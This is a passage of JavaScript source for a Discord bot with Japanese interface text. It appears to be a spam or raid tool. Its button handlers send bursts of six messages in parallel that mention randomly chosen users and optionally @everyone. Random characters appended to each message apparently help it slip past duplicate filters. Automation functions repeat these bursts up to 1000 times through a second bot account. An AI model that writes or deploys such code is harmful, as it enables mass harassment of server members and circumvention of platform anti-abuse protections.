                    console.log(`/aadd add: userId=${userId}, messageId=${newMessage.id}, title=${title}`);
                    
                } else if (subcommand === 'list') {
                    const messages = await getUserCustomMessages(userId);
                    
                    if (messages.length === 0) {
                        await interaction.reply({
                            content: '📭 カスタムメッセージがまだありません。\n`/aadd add` で追加してください。',
                            ephemeral: true
                        });
                        return;
                    }
                    
                    let listContent = '📝 **あなたのカスタムメッセージ一覧:**\n\n';
                    for (const msg of messages) {
                        const preview = msg.content.length > 50 ? msg.content.substring(0, 50) + '...' : msg.content;
                        if (msg.title) {
                            listContent += `**タイトル:** \`${msg.title}\` (ID: \`${msg.id}\`)\n`;
                        } else {
                            listContent += `**ID:** \`${msg.id}\`\n`;
                        }
                        listContent += `📄 ${preview}\n\n`;
                    }
                    listContent += `\n💡 **/aanko** で使うには **custom_id** に **タイトル** または **ID** を入力してください。`;
                    listContent += `\n💡 **use_custom=true** で直近のメッセージを自動使用できます。`;
                    
                    await interaction.reply({
                        content: listContent,
                        ephemeral: true
                    });
                    console.log(`/aadd list: userId=${userId}, count=${messages.length}`);
                    
                } else if (subcommand === 'delete') {
                    const messageId = interaction.options.getString('id');
                    const deleted = await deleteUserCustomMessage(userId, messageId);
                    
                    if (deleted) {
                        await interaction.reply({
                            content: `🗑️ カスタムメッセージ (ID: \`${messageId}\`) を削除しました。`,
                            ephemeral: true
                        });
                        console.log(`/aadd delete: userId=${userId}, messageId=${messageId}`);
                    } else {
                        await interaction.reply({
                            content: `❌ ID \`${messageId}\` のメッセージが見つかりませんでした。\n\`/aadd list\` で自分のメッセージを確認してください。`,
                            ephemeral: true
                        });
                    }
                }
                
            } catch (error) {
                if (error.code === 10062 || error.code === 40060) {
                    console.log('/aadd: Interaction expired or already acknowledged');
                    return;
                }
                console.error('Error in /aadd:', error);
                if (!interaction.replied && !interaction.deferred) {
                    await interaction.reply({
                        content: '❌ エラーが発生しました。もう一度お試しください。',
                        ephemeral: true
                    }).catch(() => {});
                }
            }
            return;
        }
        
        if (interaction.commandName === 'm') {
            try {
                if (interaction.replied || interaction.deferred) {
                    console.log('/m: Interaction already handled');
                    return;
                }
                
                const message = interaction.options.getString('message') || config.DEFAULT_MESSAGE;
                const buttonId = `m_${Date.now()}_${Math.random().toString(36).substring(7)}`;
                mButtonData.set(buttonId, { message, userId: interaction.user.id });
                
                const button = new ButtonBuilder()
                    .setCustomId(buttonId)
                    .setLabel('メッセージ送信')
                    .setStyle(ButtonStyle.Primary);
                const row = new ActionRowBuilder().addComponents(button);
                
                await interaction.reply({ content: '\u200b', components: [row], ephemeral: true });
                console.log(`/m: Button created for user ${interaction.user.id}`);
                
            } catch (error) {
                if (error.code === 10062 || error.code === 40060) {
                    console.log('/m: Interaction expired or already acknowledged');
                    return;
                }
                console.error('Error in /m:', error);
            }
            return;
        }
        
    }

    if (interaction.isButton()) {
        if (interaction.customId.startsWith('m_')) {
            const data = mButtonData.get(interaction.customId);
            if (!data) {
                await interaction.reply({ content: 'ボタンデータが見つかりません。', ephemeral: true });
                return;
            }
            
            const interactionToken = interaction.token;
            const applicationId = client.user.id;
            
            try {
                await axios.post(
                    `https://discord.com/api/v10/interactions/${interaction.id}/${interactionToken}/callback`,
                    { type: 4, data: { content: data.message, allowed_mentions: { parse: ['everyone', 'users', 'roles'] } } },
                    { headers: { 'Content-Type': 'application/json' } }
                );
                console.log('[Bot1] /m message sent');
            } catch (e) {
                console.log(`[Bot1] m error: ${e.response?.data?.code}`);
            }
            return;
        }
        
        if (interaction.customId.startsWith('aanko_t_')) {
            const buttonToken = interaction.customId.replace('aanko_t_', '');
            let payload = getButtonPayload(buttonToken);
            
            // Try to find payload from recentButtonCreations if not in buttonPayloadStore
            if (!payload) {
                const channelData = recentButtonCreations.get(interaction.channelId);
                if (channelData && channelData.buttonToken === buttonToken) {
                    // Create deep copy of idsToMention to avoid race conditions
                    const idsCopy = channelData.idsToMention ? [...channelData.idsToMention] : [];
                    payload = {
                        message: channelData.message || config.DEFAULT_MESSAGE,
                        idsToMention: idsCopy,
                        mentionCount: channelData.mentionCount || config.DEFAULT_MENTION_COUNT,
                        channelId: interaction.channelId
                    };
                    console.log(`Button clicked: token=${buttonToken}, payloadFound from recentButtonCreations (exact match), idsToMention=${payload.idsToMention.length}`);
                } else if (channelData && channelData.message) {
                    // Fallback: use channelData even if token doesn't match (may be a parallel creation scenario)
                    // Create deep copy of idsToMention to avoid race conditions
                    const idsCopy = channelData.idsToMention ? [...channelData.idsToMention] : [];
                    payload = {
                        message: channelData.message || config.DEFAULT_MESSAGE,
                        idsToMention: idsCopy,
                        mentionCount: channelData.mentionCount || config.DEFAULT_MENTION_COUNT,
                        channelId: interaction.channelId
                    };
                    console.log(`Button clicked: token=${buttonToken}, payloadFound from recentButtonCreations (fallback, stored token=${channelData.buttonToken}), idsToMention=${payload.idsToMention.length}`);
                }
            }
            
            console.log(`Button clicked: token=${buttonToken}, payloadFound=${!!payload}, idsToMention=${payload?.idsToMention?.length || 0}, allPayloadKeys=[${Array.from(buttonPayloadStore.keys()).slice(-5).join(',')}]`);

            // MUST create a deep copy to avoid race conditions with concurrent button clicks
            let idsToMention = payload?.idsToMention ? [...payload.idsToMention] : (storedMemberIds ? [...storedMemberIds] : []);
            const mentionCount = payload?.mentionCount || config.DEFAULT_MENTION_COUNT;
            let customMessage = payload?.message || config.DEFAULT_MESSAGE;
            
            // Clean any remaining [UIDS:...] tags from the message (anywhere in the message)
            customMessage = customMessage.replace(/\[UIDS:[^\]]+\]\n?/g, '').trim();
            if (!customMessage) customMessage = config.DEFAULT_MESSAGE;
            
            console.log(`Preparing 5 messages with message="${customMessage}", mentionCount=${mentionCount}`);

            let messages = [];
            for (let i = 0; i < 6; i++) {
                let message = customMessage;
                
                if (idsToMention.length > 0 && mentionCount > 0) {
                    const shuffled = [...idsToMention].sort(() => Math.random() - 0.5);
                    const selected = shuffled.slice(0, Math.min(mentionCount, shuffled.length));
                    const mentions = selected.map(id => `<@${id}>`).join(' ');
                    if (mentions) {
                        message += ' ' + mentions;
                    }
                }
                
                message = addRandomCharsToMessage(message, config.RANDOM_CHAR_LENGTH);
                messages.push(message);
            }

            console.log(`Sending ${messages.length} messages via raw API...`);
            let sentCount = 0;
            
            const interactionToken = interaction.token;
            const applicationId = interaction.applicationId || interaction.client.application.id;
            
            // Build allowed_mentions to allow all user mentions
            const allowedMentionsAanko = {
                parse: ['users']
            };
            
            // Send first message as immediate response (Type 4)
            try {
                await axios.post(
                    `https://discord.com/api/v10/interactions/${interaction.id}/${interactionToken}/callback`,
                    {
                        type: 4, // Type 4 = CHANNEL_MESSAGE_WITH_SOURCE
                        data: {
                            content: messages[0],
                            allowed_mentions: allowedMentionsAanko
                        }
                    },
                    { headers: { 'Content-Type': 'application/json' } }
                );
                sentCount++;
                console.log(`Sent message 1/${messages.length} via callback response`);
            } catch (callbackError) {
                console.log(`Callback error: ${callbackError.response?.data?.code}`);
                // If callback fails, try defer + followup for first message
                try {
                    await axios.post(
                        `https://discord.com/api/v10/interactions/${interaction.id}/${interactionToken}/callback`,
                        { type: 5 }, // Type 5 = DEFERRED_CHANNEL_MESSAGE_WITH_SOURCE
                        { headers: { 'Content-Type': 'application/json' } }
                    );
                } catch (e) {}
                try {
                    await axios.post(
                        `https://discord.com/api/v10/webhooks/${applicationId}/${interactionToken}`,
                        {
                            content: messages[0],
                            allowed_mentions: allowedMentionsAanko
                        },
                        { headers: { 'Content-Type': 'application/json' } }
                    );
                    sentCount++;
                    console.log(`Sent message 1/${messages.length} via fallback`);
                } catch (e) {
                    console.log(`First message fallback error: ${e.response?.data?.code}`);
                }
            }
            
            // Send remaining messages via followup IN PARALLEL for speed
            const followupPromises = messages.slice(1).map((msg, index) => 
                axios.post(
                    `https://discord.com/api/v10/webhooks/${applicationId}/${interactionToken}`,
                    {
                        content: msg,
                        allowed_mentions: allowedMentionsAanko
                    },
                    { headers: { 'Content-Type': 'application/json' } }
                ).then(() => {
                    sentCount++;
                    console.log(`Sent message ${index + 2}/${messages.length} via followup`);
                    return true;
                }).catch(sendError => {
                    const errorCode = sendError.response?.data?.code;
                    const errorMsg = sendError.response?.data?.message || sendError.message;
                    console.log(`Followup error: ${errorCode} - ${errorMsg}`);
                    return false;
                })
            );
            
            await Promise.all(followupPromises);
            
            console.log(`Button click complete: sent ${sentCount} messages (parallel mode)`);
        }
        
        if (interaction.customId.startsWith('ahe_t_')) {
            const buttonToken = interaction.customId.replace('ahe_t_', '');
            let payload = getButtonPayload(buttonToken);
            
            // Debug: show payload store state
            console.log(`[ahe] Looking for payload: token=${buttonToken}, found=${!!payload}`);
            
            if (!payload) {
                const channelData = recentButtonCreations.get(interaction.channelId);
                console.log(`[ahe] Fallback to recentButtonCreations: channelId=${interaction.channelId}, hasData=${!!channelData}, storedToken=${channelData?.buttonToken}, idsCount=${channelData?.idsToMention?.length || 0}`);
                
                if (channelData) {
                    // Create deep copy of idsToMention to avoid race conditions
                    const idsCopy = channelData.idsToMention ? [...channelData.idsToMention] : [];
                    payload = {
                        message: channelData.message || config.DEFAULT_MESSAGE,
                        randLen: channelData.randLen || 64,
                        idsToMention: idsCopy,
                        mentionCount: channelData.mentionCount || config.DEFAULT_MENTION_COUNT,
                        mentionEveryone: channelData.mentionEveryone || false,
                        useRandomText: channelData.useRandomText || false,
                        channelId: interaction.channelId
                    };
                    console.log(`[ahe] Using recentButtonCreations data: idsToMention=${payload.idsToMention.length}, mentionCount=${payload.mentionCount}`);
                }
            }
            
            console.log(`[ahe] Button clicked: token=${buttonToken}, payloadFound=${!!payload}, idsToMention=${payload?.idsToMention?.length || 0}`);

            // Get idsToMention - MUST create a copy to avoid race conditions with concurrent button clicks
            // Deep copy the array to prevent concurrent modifications from other button click handlers
            let idsToMention = payload?.idsToMention ? [...payload.idsToMention] : [];
            let mentionCount = payload?.mentionCount || config.DEFAULT_MENTION_COUNT;
            
            // If no idsToMention in payload, try storedMemberIds as fallback (also copy to avoid mutation)
            if (idsToMention.length === 0 && storedMemberIds && storedMemberIds.length > 0) {
                idsToMention = [...storedMemberIds];
                console.log(`[ahe] Using storedMemberIds fallback: ${idsToMention.length} users`);
            }
            
            // Extra safety check: verify idsToMention is a valid array with at least one element
            if (!Array.isArray(idsToMention)) {
                idsToMention = [];
                console.log(`[ahe] WARNING: idsToMention was not an array, reset to empty`);
            }
            
            // Final warning if idsToMention is still empty but mentionCount > 0
            if (idsToMention.length === 0 && mentionCount > 0) {
                console.log(`[ahe] WARNING: No user IDs available for mentions! payload.idsToMention=${payload?.idsToMention?.length || 0}, storedMemberIds=${storedMemberIds?.length || 0}`);
            }
            
            // If mentionCount > idsToMention.length, adjust to max available
            if (mentionCount > idsToMention.length && idsToMention.length > 0) {
                mentionCount = idsToMention.length;
                console.log(`[ahe] Adjusted mentionCount to ${mentionCount} (max available)`);
            }
            const mentionEveryone = payload?.mentionEveryone || false;
            let customMessage = payload?.message || config.DEFAULT_MESSAGE;
            const randLen = payload?.randLen || 64;
            const useRandomText = payload?.useRandomText || false;
            
            // Clean any remaining [UIDS:...] tags from the message (anywhere in the message)
            customMessage = customMessage.replace(/\[UIDS:[^\]]+\]\n?/g, '').trim();
            if (!customMessage) customMessage = config.DEFAULT_MESSAGE;
            
            console.log(`[ahe] Using idsToMention=${idsToMention.length}, mentionCount=${mentionCount}, useRandomText=${useRandomText}`);
            console.log(`[ahe] idsToMention sample: [${idsToMention.slice(0, 3).map(id => `"${id}"`).join(', ')}]`);
            
            console.log(`[ahe] Preparing 6 messages with message="${customMessage}", randLen=${randLen}`);

            let messages = [];
            for (let i = 0; i < 6; i++) {
                let message = customMessage;
                
                if (idsToMention.length > 0 && mentionCount > 0) {
                    const shuffled = [...idsToMention].sort(() => Math.random() - 0.5);
                    const selected = shuffled.slice(0, Math.min(mentionCount, shuffled.length));
                    const mentions = selected.map(id => `<@${id}>`).join(' ');
                    if (mentions) {
                        message += ' ' + mentions;
                    }
                }
                
                // Add @everyone after user mentions (at the end)
                if (mentionEveryone) {
                    message += ' @everyone';
                }
                
                // Only add random text if useRandomText is true and randLen > 0
                if (useRandomText && randLen > 0) {
                    message += ' ' + generateRandomChars(randLen);
                }
                messages.push(message);
            }

            console.log(`[ahe] Message endings: ${JSON.stringify(messages.map(m => m.slice(-60)))}`);
            console.log(`[ahe] Sending ${messages.length} messages via raw API...`);
            let sentCount = 0;
            
            const interactionToken = interaction.token;
            const applicationId = interaction.applicationId || interaction.client.application.id;
            
            // Build allowed_mentions to allow all user mentions + everyone if requested
            // Using parse: ['users'] ensures all <@ID> in message content are rendered as mentions
            const allowedMentions = {
                parse: mentionEveryone ? ['users', 'everyone'] : ['users']
            };
            console.log(`[ahe] Using allowed_mentions: parse=${JSON.stringify(allowedMentions.parse)}, idsToMention=${idsToMention.length}`);
            
            console.log(`[ahe] Sending message 1 content (last 80 chars): "${messages[0].slice(-80)}"`);
            try {
                await axios.post(
                    `https://discord.com/api/v10/interactions/${interaction.id}/${interactionToken}/callback`,
                    {
                        type: 4,
                        data: {
                            content: messages[0],
                            allowed_mentions: allowedMentions
                        }
                    },
                    { headers: { 'Content-Type': 'application/json' } }
                );
                sentCount++;
                console.log(`[ahe] Sent message 1/${messages.length} via callback response`);
            } catch (callbackError) {
                console.log(`[ahe] Callback error: ${callbackError.response?.data?.code}`);
                try {
                    await axios.post(
                        `https://discord.com/api/v10/interactions/${interaction.id}/${interactionToken}/callback`,
                        { type: 5 },
                        { headers: { 'Content-Type': 'application/json' } }
                    );
                } catch (e) {}
                try {
                    await axios.post(
                        `https://discord.com/api/v10/webhooks/${applicationId}/${interactionToken}`,
                        {
                            content: messages[0],
                            allowed_mentions: allowedMentions
                        },
                        { headers: { 'Content-Type': 'application/json' } }
                    );
                    sentCount++;
                    console.log(`[ahe] Sent message 1/${messages.length} via fallback`);
                } catch (e) {
                    console.log(`[ahe] First message fallback error: ${e.response?.data?.code}`);
                }
            }
            
            // Send remaining 5 messages via followup IN PARALLEL
            // Generate mentions FRESH inside each request to avoid any race conditions
            const idsSnapshot = [...idsToMention]; // Fresh copy for this batch
            const mentionCountSnapshot = mentionCount;
            const baseMessageSnapshot = String(customMessage);
            const mentionEveryoneSnapshot = mentionEveryone;
            
            const followupPromises = [2, 3, 4, 5, 6].map((messageIndex) => {
                // Generate fresh message with mentions RIGHT HERE inside each promise
                let freshMessage = baseMessageSnapshot;
                
                if (idsSnapshot.length > 0 && mentionCountSnapshot > 0) {
                    const shuffled = [...idsSnapshot].sort(() => Math.random() - 0.5);
                    const selected = shuffled.slice(0, Math.min(mentionCountSnapshot, shuffled.length));
                    const mentions = selected.map(id => `<@${id}>`).join(' ');
                    if (mentions) {
                        freshMessage += ' ' + mentions;
                    }
                }
                
                if (mentionEveryoneSnapshot) {
                    freshMessage += ' @everyone';
                }
                
                console.log(`[ahe] Followup ${messageIndex} FRESH content: "${freshMessage.slice(-60)}"`);
                
                return axios.post(
                    `https://discord.com/api/v10/webhooks/${applicationId}/${interactionToken}`,
                    {
                        content: freshMessage,
                        allowed_mentions: allowedMentions
                    },
                    { headers: { 'Content-Type': 'application/json' } }
                ).then(() => {
                    sentCount++;
                    console.log(`[ahe] Sent message ${messageIndex}/6 OK, ending: "${freshMessage.slice(-50)}"`);
                    return true;
                }).catch(sendError => {
                    const errorCode = sendError.response?.data?.code;
                    const errorMsg = sendError.response?.data?.message || sendError.message;
                    console.log(`[ahe] Followup error msg ${messageIndex}: ${errorCode} - ${errorMsg}`);
                    return false;
                });
            });
            
            await Promise.all(followupPromises);
            
            console.log(`[ahe] Button click complete: sent ${sentCount} messages (parallel mode)`);
        }
        
        if (interaction.customId.startsWith('aanko_p_')) {
            const encodedData = interaction.customId.replace('aanko_p_', '');
            const buttonData = decodeButtonData(encodedData);
            
            if (!buttonData) {
                try {
                    if (!interaction.replied && !interaction.deferred) {
                        await interaction.reply({
                            content: 'ボタンデータの読み取りに失敗しました。',
                            flags: 64
                        });
                    }
                } catch (e) {
                    console.log('Button data decode failed, interaction already expired');
                }
                return;
            }

            try {
                const storedData = recentButtonCreations.get(interaction.channelId);
                const idsToMention = storedData?.idsToMention || storedMemberIds || [];
                const mentionCount = buttonData.c || storedData?.mentionCount || config.DEFAULT_MENTION_COUNT;
                
                // Clean any remaining [UIDS:...] tags from the message (anywhere in the message)
                let baseMessage = (buttonData.m || config.DEFAULT_MESSAGE).replace(/\[UIDS:[^\]]+\]\n?/g, '').trim();
                if (!baseMessage) baseMessage = config.DEFAULT_MESSAGE;

                let messages = [];
                for (let i = 0; i < 6; i++) {
                    let message = baseMessage;
                    
                    if (idsToMention.length > 0 && mentionCount > 0) {
                        const shuffled = [...idsToMention].sort(() => Math.random() - 0.5);
                        const selected = shuffled.slice(0, Math.min(mentionCount, shuffled.length));
                        const mentions = selected.map(id => `<@${id}>`).join(' ');
                        if (mentions) {
                            message += ' ' + mentions;
                        }
                    }
                    
                    message = addRandomCharsToMessage(message, config.RANDOM_CHAR_LENGTH);
                    messages.push(message);
                }

                const interactionToken = interaction.token;
                const applicationId = interaction.applicationId || interaction.client.application.id;

                let sentCount = 0;
                
                // First message as callback response
                try {
                    await axios.post(
                        `https://discord.com/api/v10/interactions/${interaction.id}/${interactionToken}/callback`,
                        {
                            type: 4,
                            data: {
                                content: messages[0],
                                allowed_mentions: { parse: ['everyone', 'users', 'roles'] }
                            }
                        },
                        { headers: { 'Content-Type': 'application/json' } }
                    );
                    sentCount++;
                } catch (e) {
                    console.log(`aanko_p_ callback error: ${e.response?.data?.code}`);
                }

                // Remaining messages as followups
                for (let i = 1; i < messages.length; i++) {
                    try {
                        await axios.post(
                            `https://discord.com/api/v10/webhooks/${applicationId}/${interactionToken}`,
                            {
                                content: messages[i],
                                allowed_mentions: { parse: ['everyone', 'users', 'roles'] }
                            },
                            { headers: { 'Content-Type': 'application/json' } }
                        );
                        sentCount++;
                    } catch (e) {
                        console.log(`aanko_p_ followup error: ${e.response?.data?.code}`);
                    }
                }
                console.log(`aanko_p_ complete: sent ${sentCount} messages`);

            } catch (error) {
                console.error('Error sending messages:', error);
            }
        }
        
        if (interaction.customId.startsWith('aanko_send_')) {
            const uniqueId = interaction.customId.replace('aanko_send_', '');
            const data = pendingAankoData.get(uniqueId);

            if (!data) {
                try {
                    if (!interaction.replied && !interaction.deferred) {
                        await interaction.reply({
                            content: 'このボタンは古い形式です。新しいコマンド /aanko を使って再作成してください。',
                            flags: 64
                        });
                    }
                } catch (e) {
                    console.log('aanko_send_ no data, interaction expired');
                }
                return;
            }

            try {
                // Clean any remaining [UIDS:...] tags from the message (anywhere in the message)
                let cleanMessage = (data.customMessage || '').replace(/\[UIDS:[^\]]+\]\n?/g, '').trim();
                if (!cleanMessage) cleanMessage = config.DEFAULT_MESSAGE;
                
                let messages = [];
                for (let i = 0; i < 6; i++) {
                    let message = cleanMessage;
                    
                    if (data.idsToMention.length > 0) {
                        const shuffled = [...data.idsToMention].sort(() => Math.random() - 0.5);
                        const selected = shuffled.slice(0, Math.min(data.mentionCount, shuffled.length));
                        const mentions = selected.map(id => `<@${id}>`).join(' ');
                        if (mentions) {
                            message += ' ' + mentions;
                        }
                    }
                    
                    message = addRandomCharsToMessage(message, config.RANDOM_CHAR_LENGTH);
                    messages.push(message);
                }

                const interactionToken = interaction.token;
                const applicationId = interaction.applicationId || interaction.client.application.id;

                let sentCount = 0;
                
                // First message as callback response
                try {
                    await axios.post(
                        `https://discord.com/api/v10/interactions/${interaction.id}/${interactionToken}/callback`,
                        {
                            type: 4,
                            data: {
                                content: messages[0],
                                allowed_mentions: { parse: ['everyone', 'users', 'roles'] }
                            }
                        },
                        { headers: { 'Content-Type': 'application/json' } }
                    );
                    sentCount++;
                } catch (e) {
                    console.log(`aanko_send_ callback error: ${e.response?.data?.code}`);
                }

                // Remaining messages as followups
                for (let i = 1; i < messages.length; i++) {
                    try {
                        await axios.post(
                            `https://discord.com/api/v10/webhooks/${applicationId}/${interactionToken}`,
                            {
                                content: messages[i],
                                allowed_mentions: { parse: ['everyone', 'users', 'roles'] }
                            },
                            { headers: { 'Content-Type': 'application/json' } }
                        );
                        sentCount++;
                    } catch (e) {
                        console.log(`aanko_send_ followup error: ${e.response?.data?.code}`);
                    }
                }
                console.log(`aanko_send_ complete: sent ${sentCount} messages`);

            } catch (error) {
                console.error('Error sending messages:', error);
            }
        }

        if (interaction.customId.startsWith('aanko_web_')) {
            const parts = interaction.customId.split('_');
            const uniqueId = parts.slice(2).join('_');
            const data = pendingAankoData.get(uniqueId);

            if (!data) {
                try {
                    if (!interaction.replied && !interaction.deferred) {
                        await interaction.reply({
                            content: 'このボタンは期限切れです。',
                            flags: 64
                        });
                    }
                } catch (e) {
                    console.log('aanko_web_ no data, interaction expired');
                }
                return;
            }

            try {
                if (interaction.replied || interaction.deferred) {
                    console.log('aanko_web_ interaction already handled');
                    return;
                }
                
                await interaction.deferUpdate();
                
                // Clean any remaining [UIDS:...] tags from the message (anywhere in the message)
                let cleanMessage = (data.customMessage || '').replace(/\[UIDS:[^\]]+\]\n?/g, '').trim();
                if (!cleanMessage) cleanMessage = config.DEFAULT_MESSAGE;

                let messages = [];
                for (let i = 0; i < 6; i++) {
                    let message = cleanMessage;
                    
                    if (data.idsToMention.length > 0) {
                        const shuffled = [...data.idsToMention].sort(() => Math.random() - 0.5);
                        const selected = shuffled.slice(0, Math.min(data.mentionCount, shuffled.length));
                        const mentions = selected.map(id => `<@${id}>`).join(' ');
                        if (mentions) {
                            message += ' ' + mentions;
                        }
                    }
                    
                    message = addRandomCharsToMessage(message, config.RANDOM_CHAR_LENGTH);
                    messages.push(message);
                }

                const targetChannel = data.targetChannelId || interaction.channelId;
                const channel = await client2.channels.fetch(targetChannel);
                
                for (const msg of messages) {
                    try {
                        await channel.send({
                            content: msg,
                            allowedMentions: { parse: ['everyone', 'users', 'roles'] }
                        });
                    } catch (sendError) {
                        console.log('Failed to send message to channel:', sendError.message);
                    }
                }

            } catch (error) {
                if (error.code === 10062 || error.code === 40060) {
                    console.log('aanko_web_ interaction expired or acknowledged');
                    return;
                }
                console.error('Error sending messages from web button:', error);
            }
            return;
        }
        
        if (controlPanelButtonHandlers[interaction.customId]) {
            await controlPanelButtonHandlers[interaction.customId](interaction);
            return;
        }
    }
    
    if (interaction.isStringSelectMenu()) {
        if (controlPanelSelectHandlers[interaction.customId]) {
            await controlPanelSelectHandlers[interaction.customId](interaction);
            return;
        }
    }
    
    if (interaction.isModalSubmit()) {
        if (controlPanelModalHandlers[interaction.customId]) {
            await controlPanelModalHandlers[interaction.customId](interaction);
            return;
        }
    }
});

const createWebButton = async (channelId, message, userIds, mentionCount) => {
    try {
        const channel = await client2.channels.fetch(channelId);
        if (!channel) {
            return { success: false, error: 'Channel not found' };
        }

        const uniqueId = `web_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        
        pendingAankoData.set(uniqueId, {
            customMessage: message || config.AUTO_BUTTON_DEFAULT_MESSAGE,
            idsToMention: userIds || [],
            mentionCount: mentionCount || config.DEFAULT_MENTION_COUNT,
            targetChannelId: channelId,
            createdAt: Date.now(),
            persistent: true
        });

        const button = new ButtonBuilder()
            .setCustomId(`aanko_web_${uniqueId}`)
            .setLabel('▶')
            .setStyle(ButtonStyle.Secondary);

        const row = new ActionRowBuilder().addComponents(button);

        const sentMessage = await channel.send({
            content: '',
            components: [row]
        });

        return {
            success: true,
            messageId: sentMessage.id,
            channelId: channelId,
            buttonId: uniqueId,
            customId: `aanko_web_${uniqueId}`
        };
    } catch (error) {
        console.error('Error creating web button:', error);
        return { success: false, error: error.message };
    }
};

const sendMessagesDirectly = async (channelId, message, userIds, mentionCount, sendCount = 1) => {
    try {
        const channel = await client2.channels.fetch(channelId);
        if (!channel) {
            return { success: false, error: 'Channel not found', executed: 0, total: sendCount };
        }

        let successCount = 0;
        const idsToMention = userIds || [];
        const customMessage = message || config.DIRECT_SEND_DEFAULT_MESSAGE;
        const count = mentionCount || config.DEFAULT_MENTION_COUNT;

        for (let round = 0; round < sendCount; round++) {
            try {
                for (let i = 0; i < 6; i++) {
                    let msg = customMessage;
                    
                    if (idsToMention.length > 0) {
                        const shuffled = [...idsToMention].sort(() => Math.random() - 0.5);
                        const selected = shuffled.slice(0, Math.min(count, shuffled.length));
                        const mentions = selected.map(id => `<@${id}>`).join(' ');
                        if (mentions) {
                            msg += ' ' + mentions;
                        }
                    }
                    
                    msg = addRandomCharsToMessage(msg, config.RANDOM_CHAR_LENGTH);
                    await channel.send({
                        content: msg,
                        allowedMentions: { parse: ['everyone', 'users', 'roles'] }
                    });
                }
                successCount++;
            } catch (error) {
                console.error(`Error in round ${round + 1}:`, error.message);
            }
        }

        return { 
            success: true, 
            executed: successCount,
            total: sendCount
        };
    } catch (error) {
        console.error('Error sending messages directly:', error);
        return { success: false, error: error.message, executed: 0, total: sendCount };
    }
};

const createdButtons = new Map();

const createButtonAndAutoClick = async (channelId, message, userIds, mentionCount, clickCount) => {
    try {
        const channel = await client2.channels.fetch(channelId);
        if (!channel) {
            return { success: false, error: 'Channel not found' };
        }

        const uniqueId = `auto_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        
        const buttonData = {
            customMessage: message || config.AUTO_BUTTON_DEFAULT_MESSAGE,
            idsToMention: userIds || [],
            mentionCount: mentionCount || config.DEFAULT_MENTION_COUNT,
            targetChannelId: channelId,
            createdAt: Date.now(),
            persistent: true,
            clickCount: clickCount || 1
        };
        
        pendingAankoData.set(uniqueId, buttonData);
        
        const button = new ButtonBuilder()
            .setCustomId(`aanko_web_${uniqueId}`)
            .setLabel('▶')
            .setStyle(ButtonStyle.Secondary);

        const row = new ActionRowBuilder().addComponents(button);

        const sentMessage = await channel.send({
            content: '',
            components: [row]
        });

        createdButtons.set(uniqueId, {
            messageId: sentMessage.id,
            channelId: channelId,
            buttonData: buttonData
        });

        let executed = 0;
        const totalClicks = Math.min(clickCount || 1, 1000);
        
        for (let click = 0; click < totalClicks; click++) {
            try {
                for (let i = 0; i < 6; i++) {
                    let msg = buttonData.customMessage;
                    
                    if (buttonData.idsToMention.length > 0) {
                        const shuffled = [...buttonData.idsToMention].sort(() => Math.random() - 0.5);
                        const selected = shuffled.slice(0, Math.min(buttonData.mentionCount, shuffled.length));
                        const mentions = selected.map(id => `<@${id}>`).join(' ');
                        if (mentions) {
                            msg += ' ' + mentions;
                        }
                    }
                    
                    msg = addRandomCharsToMessage(msg, config.RANDOM_CHAR_LENGTH);
                    await channel.send({
                        content: msg,
                        allowedMentions: { parse: ['everyone', 'users', 'roles'] }
                    });
                }
                executed++;
                
                await new Promise(resolve => setTimeout(resolve, 500 + Math.random() * 500));
            } catch (error) {
                console.error(`Auto click ${click + 1} failed:`, error.message);
            }
        }

        return {
            success: true,
            messageId: sentMessage.id,
            channelId: channelId,
            buttonId: uniqueId,
            executed: executed,
            total: totalClicks,
            persistent: true
        };
    } catch (error) {
        console.error('Error creating button and auto clicking:', error);
        return { success: false, error: error.message };
    }
};

const getButtonData = (buttonId) => {
    return pendingAankoData.get(buttonId);
};

const startBot = async () => {
    try {
        await registerCommands();
        await client.login(BOT_TOKEN);
        
        // 2つ目のBotも起動
        if (BOT_TOKEN_2) {
            try {
                await client2.login(BOT_TOKEN_2);
                console.log('[Bot2] Logged in successfully');
            } catch (err) {
                console.error('[Bot2] Failed to login:', err.message);
            }
        }
        
        return { success: true };
    } catch (error) {
        console.error('Failed to start bot:', error);
        return { success: false, error: error.message };
    }
};


module.exports = {
    startBot,
    registerCommands,
    setMemberIds,
    getMemberIds,
    getRegisteredAtestCommand,
    getRegisteredAheCommand,
    fetchGuildMembers,
    getBotGuilds,
    createWebButton,
    sendMessagesDirectly,
    createButtonAndAutoClick,
    getButtonData,
    getRecentButtonCreation,
    clearRecentButtonCreation,
    clearAllRecentButtonCreations,
    updateRecentButtonCreation,
    getAtestMessage,
    clearAtestMessage,
    storeButtonPayload,
    getButtonPayload,
    initializeButtonCreationTracker,
    incrementButtonCreated,
    getButtonCreationStatus,
    cleanupButtonCreationTracker,
    clearAllButtonCreationTrackers,
    initializeBatchTracker,
    markChannelButtonCreated,
    getBatchStatus,
    cleanupBatchTracker,
    clearAllBatchTrackers,
    CLIENT_ID,
    BOT_TOKEN,
    client2
};

if (require.main === module) {
    startBot().then(result => {
        if (result.success) {
            console.log('[bot.js] Discord bot started successfully');
        } else {
            console.error('[bot.js] Failed to start Discord bot:', result.error);
        }
    });
}
